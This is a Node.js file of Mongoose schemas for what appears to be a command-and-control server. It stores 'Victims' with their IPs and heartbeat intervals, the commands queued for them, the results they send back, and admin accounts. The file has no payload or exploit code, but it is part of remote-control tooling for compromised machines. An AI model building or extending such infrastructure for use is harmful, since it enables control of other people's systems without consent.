const mongoose = require("mongoose");

const DBURI = process.env.DBURI;

mongoose.connect(DBURI).then(() => {
	console.log('Connected to mongo')
}).catch((err) => {
	console.log("Error connecting to mongo")
});

const Victims = mongoose.model("Victims", {
	ipv4: String,
	victimHostname: String,
	victimDescription: String,
	handshakeDate: Date,
	refreshToken: String,
	refreshTokenExpiry: Date,
	heartBeatInterval: Number // in seconds
});

const VictimCommands = mongoose.model("VictimCommands", {
	victimId: String,
	command: String,
	active: Boolean,
});

const CommandResults = mongoose.model("CommandResults", {
	commandId: String,
	result: String,
	resultRecievedOn: Date,
	victimId: String
});

const Admins = mongoose.model("Admins", {
	username: String,
	password: String,
	refreshToken: String,
	refreshTokenExpiry: Date,
	accountCreationDate: Date,
	active: Boolean
});

module.exports = {
	Victims,
	VictimCommands,
	CommandResults,
	Admins
};
